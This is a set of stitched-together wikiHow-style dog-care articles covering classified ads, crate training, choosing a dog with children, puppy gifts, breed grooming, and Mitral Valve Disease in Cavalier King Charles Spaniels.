Working dogs, such as Australian cattle dogs, foxhounds, German shorthaired pointers, and border collies are all generally healthy breeds. This does not, however, mean that if you adopt one it will never get sick. Be aware that even these purebreds are associated with problems, such as hip dysplasia in border collies. Always research the breed first, so that you are aware of the potential problems.

Remember that dogs are individuals.,
Gauge how active the dog is.,
Judge how socialized the dog is.,
Identify other areas to question further.",How to Navigate Dog Classified Ads2," You may have thought long and hard about which breed’s characteristics are the best fit for you, but don’t expect every single dog in that breed to perfectly match those characteristics. Read the ad’s description of the dog very carefully to get a better sense of its temperament. Keep in mind that, as with all advertising, the seller may be putting a very positive spin on behavior that you would rather do without.This is especially true with older dogs, whose private histories could drastically alter their behavior from their breed’s norm.
At the same time, puppies are not guaranteed to grow up and meet these norms, either.

, If you’re looking for a dog that’s already calm, well-behaved, or just laidback, look for signs that indicate the dog is anything but. Some sellers may clearly address the dog’s needs in terms of exercise and/or training, but always look for less obvious signs that the dog is more energetic or self-willed than you can handle (even if you're active, too). Such signs could include:Advising large homes or yards: indicates a very active dog that needs plenty of space to romp around in and structured exercise in the form of walks, jogs, and active playtime.

Vaguely describing the dog as being very energetic: a possible sign that the dog is poorly trained, easily distracted, or even destructive around the house.

Labeling it an “outside” or “crated” dog: another sign that the dog has not been properly trained.

, Again, the listing could be very specific in describing how the dog behaves around strangers, guests, children, and other pets or animals. However, be on the lookout for descriptions that sound positive but are really rather vague, especially if you have kids, housemates, or frequent guests. For instance:Simply claiming a dog is “great” with kids or other pets may not tell the whole story.
The author may be basing this on a household with just one child who is calm and self-controlled. Similarly, the dog may get along with their particular cat, but not any cat.
The dog may be outward and friendly with other dogs in neutral settings, like the park or vet, but that doesn’t mean it will share a living space with your current dog.
Or, the dog may get along with every kid and pet in your house, but be hostile to outsiders.

, Remember: this is a classified ad, not a detailed biography or behavioral assessment of the dog. Think of how many different scenarios could be meant by each simple description. Create a list of questions to ask the seller to clarify each point. For example:“Loves company:” Does this mean the dog enjoys company when it’s offered, or does it demand constant attention? Does it favor human company over other dogs? Does it experience distress when left alone?

“Protective:” What does it protect exactly? Does this mean that it’s a well-trained guard dog? Or Is it protective of your family and home to a fault and hard to control once a guest sets it off? Or is it more protective of its own resources? Does it act territorial around its food, water, toys, and/or bed?

“Likes to be in charge:” Of whom? Other pets? Or humans, too? Will it be aggressive toward other pets at home? Does it refuse to obey your commands?

Choose a breed before you start looking.,
Learn about your preferred breed(s).,
Search for trusted sellers, not for specific dogs.",How to Navigate Dog Classified Ads3," Narrow down your search through dog ads before you even start. Decide on what sort of dog you’re looking for. Think about your lifestyle, the size of your home, and your financial situation. Then research various dog breeds through sources like the American Kennel Club to find one or more that match your means and expectations. Consider such factors as:Any breed and/or size restrictions that may be mandated by your landlord, homeowners association, or local/state governments.How large or small of a dog you are comfortable bringing home, based on the size of your living space and/or whether any children are at home.
How active your lifestyle is versus how much exercise a particular breed needs.
How the dog’s age (puppy versus adult) may affect its demands on you., As you should before any major purchase, become an informed shopper. Once you narrow your list down to a few choices or settle on a final pick, familiarize yourself with each one. Arm yourself with as much knowledge about that breed as possible so you can better evaluate a seller’s ads, your conversations with them later on, and the dog itself. Focus on characteristics like:Which health issues that particular breed may develop over the course of its life.
What sort of diet is advised, either for that specific breed and/or that size dog in general.
What sort of coloring it’s supposed to have, plus which colorings may indicate genetic issues.What kind of temperament it’s supposed to exhibit at various ages.

, Once you have a firmer idea of what sort of breed you want, resist the urge to immediately start looking through ads for individual dogs. Instead, focus on finding a responsible seller. Research and visit local animal shelters.Check out the website for your preferred breed’s national club, which often include links or contact info for respected breeders.Exhaust these sources before searching for a dog through classifieds.


Respected breeders and animal shelters are ideal sources to avoid supporting puppy mills or “backyard breeders.”
Puppy mills and backyard breeders may live up to government regulations, but these regulations are very lax and still allow for miserable conditions for both parents and litters.
These conditions can result in compromised health, genetic defects, behavioral issues, and accidental mixed breeding that the seller may not even be aware of.
Pet stores are chiefly supplied by puppy mills, and both puppy mills and backyard breeders advertise through classifieds, as do scammers.That said, this doesn’t mean every single person behind classified ads in newspapers or online is suspect. But you do have to be much more discerning."

Include your kids in dog training.",How to Involve Your Kids in Selecting a Dog," For most kids the idea of getting a dog will be very exciting. Bring the issue up with your kids when they have time to get excited, ask questions, and generally freak out. You could say ""We are thinking about getting a dog. What do think about that idea?""


During that initial conversation you should bring up what your kids will have to do to care for the dog if they agree to get one. They may not remember exactly what you said, due to excitement, but you will have laid the groundwork for additional discussions.
Before you bring up the possibility of getting a dog, make sure that you can logistically do it. This means that you are allowed to have a dog where you live, that you can afford it financially, and you have the time to devote to caring for a dog.;
, Many kids will have a perfect dog in mind when you bring up the idea of getting one. Ask them ""What kind of dog would you like to get?"" Listen to what they have to say and discuss their desires. You may not be able to give them everything they want, but it's good to know their desires so that you can keep them in mind.


If your kid is creative, have them draw their perfect dog. This can be a fun project that will make them feel involved in the process.

, Once you hear what your kids want in a dog, tell them what you want and what you think the family needs. This conversation will be about you considering the kid's desires but also keeping the family's best interests in mind.


This conversation is a good time to practice compromising and to teach your kids how to compromise in a way that feels good for everyone. For example, you could say ""I understand that you want a golden retriever but we have a small home, so a dog that big won't work. Maybe we could find a smaller-sized dog that will be friendly and well behaved like a golden retriever.""
You may have several kids and they may have different ideas about what kind of dog they want. If this is the case, you will need to find a way to get them to compromise. This may require reminding them that if there is no compromise there will be no dog.
Try having everyone make a list of the traits they want in a dog, from most important to least important. Once you have clear lists you can more easily figure out a dog breed that will fit your needs.

, After you have decided as a family to get a dog, the fun part comes! Look at listings of dogs on the websites of local animal shelters or rescue organizations. You can also review the websites of local dog breeders and pet stores.


Look at lists of dog breeds that are generally good with children. Have your kids pick out a few breeds from these that they like. Some particularly good dog breeds for kids include the bulldog, beagle, golden retriever, Labrador retriever, Weimaraner, bull terrier, and Newfoundland.Make sure that the websites of pet stores and breeders you are looking at are of organizations that breed ethically. In order to assess whether they are ethical, look at dog organizations, such as the American Kennel Club, for lists of ethical breeders in your area.

, Include your kids in every step of the process, especially the part where you go and meet potential dogs. This is a good time for your kids but it also allows you to see how a potential dog will interact with your children.


Only allow the kids to interact with potential dogs when you or another adult are in the room.
How a dog interacts with children can be a big factor when adopting a rescue dog. Even if you are looking at breeds that are generally good with children, every dog has the potential to bite.Discuss your needs with the staff at any rescue organizations you visit and they can help steer you towards dogs that will be appropriate for you and your kids.

, Ask if there were any dogs they particularly liked or disliked. Also ask the kids why they decided on particular dogs in order to figure out what is very important to them.


If the kids didn't like any of the dogs you have seen, then you will probably need to go meet more dogs.

, Once you have visited with a variety of dogs, you will need to make a decision. Listen to which dogs your kids loved and why. However, this is a point at which you may need to make a decision that goes against your children's wishes. Think about their desires but ultimately make a decision for the good of the family and for the good of the animal you are going to adopt.


It may be that you agree with your kids and you all get the dog that you really, really want. However, it may be that you need to overrule them if they want a dog that is not logistically reasonable or could be a danger to them.
Be clear and honest about why you are making the final decision, whatever it is.

, Involving the kids in buying the things the new dog will need can be a fun part of the process of selecting a dog. Allow the kids to pick out special dog toys and pick the bedding together with them.


Make sure that your dog's basic needs will be met while allowing the kids to be involved. For instance, you will probably need to explain to the kids why a certain food is good or bad and you may need to just pick the food yourself.

, Feeding your dog daily is a great job for kids, as it easy and the dog will respond well to their work.Just make sure that they actually do it and that they do it at the same time every day, as you don't want to deny the dog its regular meals.


Even if your kids are young, they can help you feed the dog. Getting them involved in caring for the dog early will make them more engaged with the dog and better pet owners throughout their lives.

, Walking the dog is a great job for a kid that is at an age where they can go on a walk by themselves.This will not only give your kid a job and a small responsibility, it will also force them to get a little bit of exercise as well.


Taking the dog for a walk is an important part of dog care, so letting your kids off the hook and allowing your dog to go without a walk is not alright. Every dog deserves a daily walk, even if in the end you have to do it.
Keep limiting factors, such as the age of the dog and the size of the dog, in mind. If the dog is a puppy or doesn't want to go to the bathroom without specific encouragement, then you may need to go on the walk and supervise. If the dog is large and strong, you may need to walk the dog just because it could knock your child down.

, Depending on the type of dog you get, there may be a variety of thing that you can have your children do to care for it. One easy thing for your kids to do is grooming, such as brushing and washing the dog.For example, have your kids brush the dog once a week. This is a good job for them because the physical contact can help them to bond with the dog.
While it may be annoying to continually remind your kids to care for the dog, remember that it is important that they learn about responsibility from an early age. , Teach your kids dog commands and how you get your dog to do them while you are teaching them to the dog. This will be a good project that the whole family can do together and it will help assure that the dog follows the directions of everyone in the family.


Caring for a dog can give the kids important lessons about responsibility. Overall, think of it as training the kids, in addition to the dog.

Establish rules early.,
Make sure rules are consistent.,
Keep socialization to a minimum.,
Introduce yourself when entering a room.,
Help kids get friendly with the new dog.,
Introduce pets to the new dog.",How to Get Used to a New Dog1," While it may seem like a better idea to let your new dog relax during the first few days of its arrival, it is important to let it know exactly how things work in its new home from the start. Being lenient for this initial period will only serve to confuse your new pet and make it more difficult to establish the rules later on. Be kind but firm in letting it know what will and won’t be allowed.For example, do not let your new dog climb onto the furniture if it will not be allowed to do so later on. If it jumps on a couch or chair, firmly say “No” and gently guide it off.;
, To get your new dog settled comfortably, and to adjust to your new pet, make sure that you and your family members are all on the same page about your house rules and uphold them accordingly. It is important that your new dog does not get mixed messages from its owners about how it should be behaving. If necessary, write out a list of the most important pet-related house rules and hang it on the fridge or wall where everyone can see it. Some rules might include:


“No pets on the couch”
“Don’t feed the dog any table scraps”
“The dog should never be walked without its leash and harness”

, During its first few days with you, make sure that you don’t overwhelm your new pet with social activity. While it is still adjusting to your home and family life, your dog should not be burdened with extra stress or over-excitement (e.g. meeting friends and relatives). Adjustment periods vary between dogs based on breed, age, and history, but a minimum of 3-4 days should be allotted to getting your new pet acclimated at home., Your new dog will likely be a bit jumpy for the first few days that it spends in your home, while it adjusts to new sounds, surroundings, and routines. Make an effort to announce yourself when approaching it so that it doesn’t get startled or feel ambushed. Use a soft but clear voice to greet your dog (e.g. “Hi Spot, it’s me!”) and let it gradually get accustomed to your presence., If you have children, help them adjust to your new dog by explaining everything that their new pet will need (food, walks, grooming, training, etc.). Tell them clearly what behaviors to avoid (such as approaching the dog to play while it is eating), and explain that they will have to be patient with their new friend. Supervise games while they play with the new dog, have them feed it treats and make lists of tasks they can do to help with its care (e.g. filling its food and water bowls)., If you have other dogs or cats, let them meet the new dog in a neutral place before bringing it home, like a friend's house. Animals can be very territorial, so meeting a new dog at home can cause aggression or defensiveness in your other pets. Make sure that there is plenty of everything at home (e.g. toys, food bowls, sleeping spots) and supervise play for the first couple of weeks to make sure your pets are getting along.Make an effort to keep your pets routines the same while phasing in your new dog. Keeping all your animals happy and comfortable will help for a smoother transition.

A puppy will need to be housebroken, trained and exercised.If you plan to buy a puppy for a child, be sure to speak to their parents.
If you don’t want to spoil the surprise, drop some hints about dogs or talk to someone close to the recipient.;
, Assess the recipient’s lifestyle and home situation to determine what kind of they dog you would like. Ask them some key questions:


How active of a dog do you want?
Are you okay with grooming it regularly?
Do you have enough space for a big dog or would a small dog work best?

, Adopting a dog can be one of the best things you’ll ever do. Animal shelters can be great sources of both mixed-breed and pure-breed dogs.Search for animal shelters in your area and go take a look.
If you are looking for a specific breed, call ahead.

, Pet stores often get their animals from puppy mills. Puppy mills treat their animals poorly and take advantage of their dogs.Don’t support them! A great place to start, is to ask your vet for recommendations.Look for a breeder that:


Allows you to visit and observe where they keep the dogs. These spacious should be spacious and clean.
Breeds only a few types of dogs and is knowledgeable about those breeds.
Provides you with a written contract and health guarantee for your puppy.

, If you are not 100% sure that the recipient wants to a puppy, think about giving a gift certificate or IOU. Admittedly, this is not as exciting as giving an actual puppy on Christmas morning, but it could save both the puppy and the recipient from a lot of hassle! Some breeders and animal shelters offer gift certificates.
Alternatively, you can make a handmade IUO.
You can include a stuffed animal puppy with your gift certificate or IOU.

Go for regular walks.,
Feed your dog at regular times.,
Establish regular “potty breaks”.,
Teach your dog basic commands.",How to Get Used to a New Dog2," Establishing a regular walking routine is an important step in getting used to your new dog, and vice versa. Walking your pet establishes leadership, enables bonding, and is mutually beneficial health-wise. Choose a time, once a day, that you will be free to walk your dog and stay consistent about walking your dog at that time (e.g. after supper, every evening). Be sure to walk your dog for at least 20-30 minutes a day. If your dog is a larger breed that needs more exercise (e.g. a Rhodesian Ridgeback), walk it for longer, or more than once a day.

, It is important to feed your dog every day at the same times to let its mind and metabolism adjust to them pattern. It is also important for you, as an owner, to have a set routine for feeding your pet to keep it up consistently and have it accommodate your schedule. Choose a place to feed your dog that is comfortable for it and convenient for you; always feed your dog at this spot, when possible.During the first few weeks with your new dog, set a timer or alarm to remind you when it’s time to feed your new pet.

, Dogs should be given the opportunity to go outside to eliminate at least every 6-8 hours, if not more often. Set a particular schedule for when your dog will be let out to relieve itself- once it recognizes the pattern, its anxiety about bathroom breaks will be eased. Set an alarm on your phone or watch to remind you when to let your dog out, or set up a schedule where you and members of your family take turns bringing the dog outside., To bond with your pet and assert your leadership, teach it basic commandsto follow when prompted. Communicate what you want your dog to do by gesturing, and gently holding or pulling its collar. Use positive praise and treats when the dog fulfills your command; repeat the process often. The five basic commands your dog should know are:Sit
Stay
Lay down
Kneel
Come

Buy your new dog a crate.,
Introduce it to the crate.,
Prepare your dog for being alone in the crate.,
Leave the house.,
Crate your dog at night.,
Stop crate training when it is no longer necessary.",How to Get Used to a New Dog3," Crate training is a good way to alleviate your new dog's anxiety about its new home and manage its behaviour by containing it while you are away. Dogs have a natural denning instinct, so your pet's crate can be a safe, comfortable place for it that it will avoid soiling (making it an effective way of house training, if necessary). Make sure to buy a crate that is large enough for your new dog to stand up straight in, lie down comfortably, and turn around without difficulty.Visit the Association of Professional Dog trainers website at https://apdt.com/pet-owners/crate-size/ to find out what crate size is appropriate for your dog.

, Avoid forcing your dog into its crate - the crate is not a punishment, and your dog should feel at home in it. Set up the ""den"" and leave it open for your dog to explore, with some treats and toys in it to draw interest. When you first close the crate door behind your dog, be sure that there is food to keep its interest and stay closeby, talking reassuringly to your pet. A trick to drum up your dog's interest in the crate is to lock it OUT of the crate, with its dinner locked inside. After a few minutes your dog will absolutely want to be in its den, and have a positive (food-based) association with it.

, Sit next to your dog's crate for a period of 10-15 minutes while it is locked inside, then leave the room for a few minutes and come back. Repeat this several times a day, gradually extending the amount of time that you leave the room. Once your dog can stay quietly on its own for 30 minutes, you can consider leaving the house with your dog crated., Start leaving the house for short periods of time with your dog crated. Leave toys in the crate and try crating your dog 10-20 minutes before you leave so that it is not directly associated with your departure. Keep the following tips in mind:


Do not give your dog any prolonged or enthusiastic goodbyes before leaving - be matter of fact and leave the house without making a fuss.
Continue to crate your dog periodically when you're at home so it doesn't associated being crated with you leaving, exclusively.
When returning home, be very low key and avoid indulging your dog's excitement about seeing you.

, Crate training should happen at night as well, when both you and your dog should be sleeping. Start by placing the crate it your bedroom, or just outside so the dog does not feel alienated. As your dog seems more comfortable and sleeps through the night, try moving it to another area of the house so your dog can get used to sleeping on its own., Crate training should only last until you trust your dog to be alone unsupervised at home - depending on the dog, this can last anywhere from a few days to a few weeks. Once training is done, leave your dog's crate in the house somewhere, open for it to retreat to whenever it wants. The crate can still be used to transport the dog (e.g. trips to the vet)."

Some breeders will allow you to purchase the puppy ahead of time and pick it up on Christmas Eve.

, If you live with the recipient, you'll need to find a place for the puppy to stay prior to Christmas. Speak to close neighbors or relatives who could take on this task. Make sure the place is suitable for a puppy, and that the caregiver understands what to do.Work out a schedule for when you can drop by and help with walking, feeding, or cleaning up.

, The puppy will need food, bowls, chew toys, a place to sleep, a collar and leash, and some puppy pads for the floor. You will need these items to take care of the puppy yourself, but it’s also a great idea to include this with your gift., Whether the puppy will end up living with you or some place else, make sure this place is safe for a puppy.


Move any cords that the puppy could chew on.
Get rid of any poisonous plants that could make the puppy ill., Before you give a dog as a gift, it is crucial to make sure he or she has a clean bill of health.

Wait until the last minute to do it.
Avoid tying anything around his neck.
Simply leave the ribbon-clad puppy in front of the Christmas tree, but beware of him chewing other gifts.

, A third option is to wrap up a box full of dog items (food dishes, toys, etc.). When the recipient opens this box, allow the puppy to run out and great his new friend!

Thinning shears help you blend uneven hair around the shoulders, back leg feathering and chest.If you are unsure of what specific scissors and shears to purchase, consult a groomer or go to your local pet store.;
, Just like choosing grooming tools, high-quality shampoo and conditioner will help you keep your dog’s skin and coat clean and healthy. There are many types of shampoos and conditioners to choose from, some of which are specific for certain skin conditions. If you are unsure of what type to purchase, talk with your veterinarian to see what would work best for your dog.


Finding the right shampoo and conditioner is likely going to be a trial and error process.Cocker Spaniels are prone to a skin disease called seborrhea, which causes their coats to become greasy and flaky.If your dog has seborrhea, your veterinarian can help you determine what specific shampoo and conditioner would work best for this skin condition.

, In addition to caring for your Cocker Spaniel's coat and skin, you will need to clean his ears and eyes, trim his nails, and brush his teeth on a regular basis. You can purchase these products at your local pet store, pharmacy, or veterinarian's office.


To clean his ears, you will need an ear cleaning solution that removes wax buildup in the ears. Your veterinarian can recommend which solution to use.For cleaning his eyes, you will need to use a dog-safe soap. Talk with your veterinarian before going to the pet store to purchase the soap.Guillotine-style nail clippers are preferable for trimming a dog's nails. Unlike regular human clippers, guillotine-style clippers do not squeeze the nail before cutting it, making the nail-trimming process less painful for your dog. In addition to clippers, you will need either styptic powder or baking soda in case a nail starts to bleed after your trim it.
To brush your dog's teeth, you will need dog-specific toothpaste and a toothbrush. Your veterinarian can recommend which toothpaste and toothbrush to use.

, Many owners of Cocker Spaniels choose the ‘puppy cut,’ which keeps the dog’s hair short all over. Even though the hair is shorter, this cut still requires regular grooming (about every two weeks).The puppy cut is for Cocker Spaniels that are not being shown in dog shows.


If your Cocker Spaniel is a show dog, consider having your dog professionally groomed. Although you could learn how to do this level of grooming on your own, it is probably worth the investment to have your dog groomed by a groomer who is well versed in American Kennel Club grooming guidelines., Use your pin brush and matting or wide-toothed comb to do this. Giving your dog a good overall combing and brushing will get rid of the hair shed and matted fur before bathing. Remember that Cocker Spaniels have two layers of hair (under and outer coat), so make sure that you comb and brush through both coats.Dog owners often make the mistake of only combing the outer layer of hair, which leaves the under coat more prone to getting dirty and matted.Begin at your dog’s neck and brush back to your dog’s tail and down his legs in the direction of hair growth. Because Cocker Spaniels have a lot of hair, it may be helpful to section the hair and work section by section.Use your comb for detangling, if necessary. You may need to use scissors to cut out the matted hair if it is too tangled to comb and brush through. If you have to use the scissors, take care not to make the section where you cut uneven with the rest of the coat.When you brush your dog’s head and ears, use a soft-bristled brush., Cocker Spaniels typically like being bathed, so this will probably be enjoyable for the both of you. If your dog has a skin condition that makes his skin more sensitive, make sure not to scrub the hair and skin too vigorously.


It would be good to bathe your dog about every three months.Do not bathe him too frequently, since frequent bathing could strip out the essential oils that keep his skin and hair healthy.Using warm water will feel good on your dog’s skin.
Dry off your dog with a professional blow dryer. You can ask a groomer for recommendations on what type of blow dryer to use.

, Attach a 10 or 15 blade to your clippers. Holding your dog’s muzzle, start below your dog’s bottom eyelid and carefully shave down to his nose against the direction of hair growth. Hold the skin taut to remove any skin folds that may cause you to nick his skin by accident.Pull and hold his ear back. Since Cocker Spaniels have such large and floppy ears, you can simply flop his ear back and hold it on the top of his head. Starting near the opening of his ear, shave forward all the way down to his lips, being careful not to nick the skin.Lift the floppy part on both sides of his upper lip and shave the hair under his upper lip. The hair in this area can become moist and dirty with mucous, so it’s important to keep that hair short and clean.Carefully shave against the direction of hair growth around your dog’s eyes, being careful not to shave off his eyebrows.Angle his head upward and shave his neck, going upward from his sternum (breastbone) all the way up to his chin. The skin in this area is very sensitive, so be extra careful not to nick the skin; holding the skin taut will help prevent nicks.Shave around the top of your dog’s head (the crown). You may want to switch to a 3 ¾ blade for a closer trim. After you have shaved this area, comb any remaining hair forward and use your scissors and thinning shears to trim the hair that is closer to your dog’s eyes.As you are clipping, don’t forget regularly check to blade to see if it is hot. If the blade is hot, let it cool down before resuming clipping; the heat could damage your dog’s skin., To shave his ears, flip his ears back down and shave only the top portion of his ears; do not shave the entire length of his ears. Make sure to shave in the direction of the hair growth.Use a 10 blade or 15 blade to shave his ears.
To stabilize the ear while you are shaving it, hold the underside of the ear with your opposite hand and bend the ear over that hand., To do this, switch to a 7 blade and first shave from the back of your dog’s head to the tip of his tail. Shave in the direction of hair growth, and follow the natural wave of the hair and the curve of your dog’s back.When you shave your dog’s tail, continue to use the 7 blade and shave down in the direction of hair growth. After shaving, comb his tail and see if there are any areas that need to be trimmed with more detail using your scissors., Do not use the clippers on your dog’s feet. To trim the hair, hold your dog’s paw in one hand and comb the hair down in the direction of hair growth. Turn the paw over so that the pad is facing upward. Using your pair of scissors, gently clip the hair down to the top of the toenails.Work your way around the pad in a circular fashion, making sure not to accidentally clip the paw pad with your scissors. Then, turn the paw back over, comb the hair again, and clip more as needed to create a bevel shape with the hair.When you have finished trimming the hair, the hair should still cover the toenails.

, Regularly trimming your dog’s nails is an important aspect of grooming. Clip the nail in small increments until you see the quick, which is the blood vessel that runs through the nail. The quick will be easier to see with lighter nails. If your dog has dark nails, use more caution when you are clipping the nails.


If the nail starts to bleed, dab a small amount of styptic powder or baking soda on the nail. The bleeding will stop immediately.
It is recommended to trim your dog’s nails about every two to three weeks.If you are uncomfortable with your dog's nails, your veterinarian or veterinary technician can do so.

, If you see a lot of buildup around your dog’s eyes, it will be necessary to clean and remove that buildup. When you clean the eyes, put a small amount of soap and warm water on a towel and gently dab around the eyes., Cocker Spaniels are very prone to getting ear infections and having lots of wax buildup in their ears. Ideally, you should clean his ears on a weekly basis.Consult with your veterinarian so that you know the proper technique for regularly cleaning your dog’s ears at home.


If the ears have a foul odor, an ear infection is likely. Your veterinarian will be able to determine the cause of the infection (eg, bacteria) and prescribe an ear drop solution that you can administer at home.
If you see a lot of wax, you will need use an ear cleaning solution to remove the wax. There are over-the-counter ear cleaning products that you can purchase at your local pet store. Read and understand the directions carefully before cleaning your dog's ears on your own.
In more serious cases of ear infection and wax buildup, your veterinarian can flush out your dog’s ears., To keep your dog’s teeth nice and clean, it is recommended to brush your dog’s teeth every other day. Your dog probably won’t be immediately comfortable with you brushing his teeth, so you can start with rubbing your finger along his teeth with something that he likes, such as peanut butter.Gradually introduce him to the toothbrush and toothpaste. Be gentle when you brush his teeth, and do it in short intervals (about 5 minutes).If you are having trouble with brushing your dog’s teeth, your veterinarian can teach you the proper technique.

Follow the veterinarian's management recommendations.",How to Diagnose Mitral Valve Disease in Cavalier King Charles Spaniels," Your Cavalier should be seen by the vet if he has persistent coughing (that lasts for several weeks). Coughing can be caused by an enlarged heart that pushes up on the windpipe. It's also a result of fluid on the lungs (also known as pulmonary edema).


Fluid on the lungs is a symptom of mitral valve disease (MVD). With MVD, blood leaks in the opposite direction so the heart doesn't pump effectively. The blood can start pooling and forcing fluid into the lungs, making your dog cough.;
, Fluid in your dog's lungs can make it harder to breathe and get oxygen. You may notice your Cavalier breathes heavily, even when resting. Count your dogs breaths per minute while he's asleep. If he takes more than 30 breaths a minute, he should be seen by the vet because of the abnormal breathing.


Difficulty breathing is a sign of congestive heart failure which can be caused by MVD., If your Cavalier has MVD, he'll get tired easily when playing or exercising. This is because his body has trouble delivering enough oxygen to his muscles, which he needs for vigorous exercise or play. In severe cases, your Cavalier may faint during walks or become alarmingly breathless during other exercise.


You may also notice that your dog coughs more immediately after exercising. This is one of the earliest symptoms of MVD., Your Cavalier will find it harder and harder to breathe as MVD progresses. It may become so hard for your dog to breathe, that he stops eating because he doesn't want to take time away from breathing in order to chew and swallow food.


Your dog may lose weight and appear uncomfortable because he can't find a comfortable position in which to breathe., When the heart has trouble pumping, the kidneys can retain fluid which gets squeezed into your dog's abdomen. Feel your dog's belly to see if it's swollen or looks like a pot belly.This can be a sign that MVD is causing fluid buildup.


At first, it might look like your dog has put on weight, but if you can easily feel the ribs and backbone, this means there is little fat under the skin. This is a symptom of MVP, not obesity.

, Cavaliers are already 20 times more likely to develop MVD than other breeds. Male dogs are 50% more likely to develop degenerative heart disease than females.In general, small dogs are more prone to heart valve diseases.


Commonly affected breeds include the Chihuahua, Boston terrier, miniature poodle, miniature pinscher and fox terriers., The vet will carefully watch your Cavalier to observe his body posture and breathing. The vet is trying to see if your dog's breathing is labored or too fast. The vet will also use a stethoscope to listen to the heart's rhythm, rate, and sounds. Specifically, the vet is listening for a heart murmur on the left side of the chest.A murmur is always present with MVD so the absence of a murmur rules the condition out at the moment. Your Cavalier will still need to be checked again in the future to see if MVD develops.

, If the vet hears a heart murmur, further tests may be needed, depending on how far the disease has progressed. A full blood panel may be ordered to check if poor blood circulation has damaged organs. It will also be used to check for anemia (a lowered red blood cell count) since severe anemia can actually cause heart murmurs.


Blood tests will also help in evaluating electrolyte levels. Knowing your Cavalier's electrolyte levels can help your vet prescribe medications for MVD and determine the proper dosage.

, The vet may want to see whether or not your Cavalier's lungs are filled with fluid. Chest radiographs can check for pulmonary edema.Two views will be taken of your dog's chest, one from above and one from the side.


Radiographs will inform the clinician about where the fluid is within the lungs and whether it's caused by heart disease or another condition like pneumonia.

, A cardiac ultrasound exam (heart echo) lets the vet measure the sizes of the different chambers in the heart. The exam also shows how well or poorly the heart is contracting. The clinician can also use color-flow Doppler on the ultrasound to create an image of the size and strength of the backflow of blood. All of this information can help the veterinarian determine the right medications, doses, and outlook for your dog.


Sometimes an ECG (electrocardiogram) is run if the vet detects an irregular heart rate. This is important to check out since an irregular heart rate can lead to heart attacks.

, Since MVD can't be treated, your veterinarian will want to control symptoms. Your Cavalier might be prescribed medication to slow fluid buildup and help his heart contract. Depending on how progressed your Cavalier's case is, the vet might recommend supplements, changes in diet, or surgery (like valve replacement).Regular check ups are important, even if your dog isn't diagnosed with MVD. Since the probability of Cavalier's developing MVD is so high, regular exams can catch it if your dog develops it in the future."

Trim the dog's hair regularly.,
Take your Shih Tzu to a professional groomer if you can't take care of the dog's grooming yourself.",How to Take Care of a Shih Tzu1," There is no set frequency and over-bathing can dry out the skin and coat. Around once a month is considered a good compromise, with some dogs needing bathing more frequently and others less — depending on how dirty your dog gets. You will also need to brush or comb their hair at least once daily in order to prevent matting of the fur.


Shih Tzu have a coat of hair, not fur. This means that their coat will not shed. Just like human hair, Shih Tzu hair needs to be taken care of or it will become a knotted mess.
Pay particular attention to the hair around your dog's eyes. If you leave their hair long, you will need to tie the hair around their eyes up.This will help to keep the hair out of their eyes and out of their food and water dishes.;
, Because Shih Tzu don't shed, their hair can grow very, very long. Take the time to have you dog's hair cut so that it does not become unmanageable. If you are not showing your Shih Tzu, consider giving it a short ""puppy"" cut, instead of the classic long show coat for ease of care.Pay particular attention to the dog's eye area but be careful when using scissors around your them!

Remember that dogs who nip and go crazy inside the house may need more exercising outside! Exercise not only helps a dog's body but it can also help their mind.

, Keep in mind that some Shih Tzu have allergies or stomach sensitivities. If you try a brand of dog food that doesn't seem to agree with your dog, try changing it. If you continue having problems, check with your vet for a recommendation of a good 'breed specific' brand of food.

, As with any pet, your goal should be for your Shih Tzu to be happy and healthy and your veterinarian is the best person to help you achieve that goal.

, With this breed, frequent vet visits are even more important because they are prove to a variety of unique health issues. This includes hip dysplasia, Von Willebrand disease, and Autoimmune Haemolytic Anaemia.


Shih Tzu are prone to eye problems like Progressive Retinal Atrophy (PRA), a group of diseases that attack certain breeds of dogs.It is characterized by the bilateral degeneration of the retina, basically progressive vision loss culminating in blindness. Be alert for the dog bumping into things, not spotting where a toy is, or sudden loss of confidence in novel situations.
Shih Tzu are also prone to disc problems and back pain.

Realize that older dogs tend to be adaptable.",How to Know if a Senior Dog Is Right for Your Family1," Puppies are adorable creatures that are easy to love, but housebreaking a puppy can be a frustrating and tedious process. A prime benefit of bringing a senior dog into your home is that, in most instances, the housebreaking has been done for you. Furthermore, most senior dogs have good manners, and some can even perform tricks.Senior dogs will almost always be potty trained.
Many will also be able to perform “sit,” “down,” “come,” and other commands.
This is especially great for busy families who may not have time to train a puppy.;
, Older dogs have had to refine their social skills and learn to live around people. As such, they tend to be more patient and tolerant than younger dogs or puppies. This can be very helpful if you have kids at home.If a senior dog suffers from a painful ailment—like arthritis—they may not like to be grabbed or climbed on.

, The old adage that you “can’t teach an old dog new tricks,” is actually very misleading. Older dogs tend to go with the flow more easily than younger dogs, and can easily find their place in your household.This can be great if you have additional dogs or other pets at home.

To find such a food, look at the dog food ingredient list on the label. Meat and vegetables should be the first three or four ingredients in the dog food as opposed to meat by-products and grains.Follow the feeding recommendations on the dog food label to make sure you aren’t over or underfeeding your English springer spaniel. Most spaniels are fed twice a day.Avoid feeding your dog avocados, alcohol, chocolate, grapes and raisins, various nuts, onions, garlic and chives, yeast dough, and xylitol, which is found in sugar free foods.;
, If you want to feed your English springer spaniel some good snacks, try the following foods in small amounts:


Rinsed canned beans
Small slices of cooked sweet potatoes
Baby carrots
A few frozen peas or blueberries, The English springer spaniel is a very active dog. Keep yours well hydrated by always having fresh, clean water available.


Clean the water bowl frequently to reduce the bacteria load in the bowl.

, The English springer spaniel sports a beautiful coat with feathering at the legs. Because of this, many people chose to have their English springer spaniel professionally groomed to accentuate the beautiful coat. You can groom your dog at home, however. You can trim the fur around the head, neck, ears, tail, and feet. This can help keep your dog looking neat and keep the hair healthy.Some will have their springers shaved during the warmer months.

, Make sure to brush your dog’s coat one to three times a week to remove loose hairs and tangles from the feathering. This helps avoid matting in the fur.A good brushing encourages skin circulation and gives you a chance to check the skin for problems like fleas, ticks, cysts, lumps, and bumps. Treat any fleas or ticks promptly with a topical spot on treatment. It is actually a great idea to treat your dog with it once a month as a preventative.

, Because the English springer spaniel has such long, floppy ears, you need to check them and clean them. This helps prevent ear infections. Just gently wipe out the part of the ear you can see with a cotton ball. Your vet can recommend a good cleaning solution.Don’t stick anything down into your dog’s ear. If your dog’s ears smell bad or are red and tender, or the dog is favoring the ears, take her to the vet to get them checked for infection.

